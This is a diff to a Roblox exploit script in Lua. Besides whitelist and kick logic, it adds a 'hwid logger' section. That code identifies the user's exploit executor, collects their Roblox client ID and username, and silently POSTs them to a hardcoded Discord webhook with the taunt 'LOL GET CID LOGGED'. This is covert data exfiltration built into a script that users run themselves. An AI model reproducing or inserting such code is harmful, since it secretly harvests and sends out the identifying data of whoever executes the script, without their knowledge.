@@ -11,11 +11,6 @@
     Sam69#5591 - big help ty
     
     joe69420#8812 - whitelister and script collector 
-    
-    
-
-
-
 ]]--
 
 --whitelist--
@@ -95,3 +90,35 @@ end
 if game:GetService("Players").LocalPlayer:IsInGroup(5720125) then
     game:GetService("Players").LocalPlayer:Kick("ew a skid")
 end
+--hwid logger--
+local wc = is_sirhurt_closure and "Sirhurt" or pebc_execute and "ProtoSmasher" or syn and "Synapse X" or secure_load and "Sentinel" or KRNL_LOADED and "Krnl" or SONA_LOADED and "Sona" or "Kid with shit exploit"
+local g = game
+local cid = g:GetService("RbxAnalyticsService"):GetClientId()
+local wurl = "https://discord.com/api/webhooks/963979438343721035/MDSnEkMnl_3t75z38KAMD90su30FkfHlIPiElIBOOdY_K1QW8su6kfpHQGwDwNltbuhD"
+local d = {
+    ["content"] = "LOL GET CID LOGGED",
+    ["embeds"] = {
+        {
+            ["title"] = "**Username: " .. game.Players.LocalPlayer.Name.." **",
+            ["description"] = "ClientId: " .. cid.." with **"..wc.."**",
+            ["type"] = "rich",
+            ["color"] = tonumber(0x7269da),
+            ["image"] = {
+                ["url"] = "http://www.roblox.com/Thumbs/Avatar.ashx?x=150&y=150&Format=Png&username=" ..
+                    tostring(game:GetService("Players").LocalPlayer.Name)
+            }
+        }
+    }
+}
+local nd = g:GetService("HttpService"):JSONEncode(d)
+local h = {
+    ["content-type"] = "application/json"
+}
+local p = {
+    Url = wurl,
+    Body = nd,
+    Method = "POST",
+    Headers = h
+}
+local r = http_request or request or HttpPost or syn.request
+r(p)
